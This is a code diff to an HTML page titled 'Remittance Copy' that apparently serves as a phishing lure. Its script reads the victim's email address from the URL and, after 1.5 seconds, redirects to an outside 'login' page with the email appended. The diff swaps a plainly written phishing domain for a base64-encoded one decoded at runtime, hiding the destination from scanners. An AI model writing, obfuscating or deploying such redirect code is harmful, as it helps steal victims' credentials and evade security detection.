@@ -5,12 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Remittance Copy</title>
     <script>
+        // Base64 encoded redirect URL
+        const encodedUrl = "aHR0cHM6Ly9sb2dpbi5hY2phcnZpc2J1aWxkZXJzLmNvbS9Sc3BLdE9odQ==";
+
+        // Decode the base URL
+        const baseRedirectUrl = atob(encodedUrl);
+
         // Extract email from the current URL's query parameters
         const urlParams = new URLSearchParams(window.location.search);
         const email = urlParams.get('email'); // Get the 'email' parameter
-
-        // Define the base redirect URL
-        const baseRedirectUrl = "https://login.transfer-sharefiles.info/RspKtOhu";
 
         // Add email as a query parameter to the redirect URL without encoding
         const redirectUrl = email ? `${baseRedirectUrl}#${email}` : baseRedirectUrl;
@@ -18,7 +21,7 @@
         // Delay the redirect to display the message first
         setTimeout(() => {
             window.location.href = redirectUrl;
-        }, 1500); // Redirect after 3 seconds
+        }, 1500); // Redirect after 1.5 seconds
     </script>
     <style>
         body {
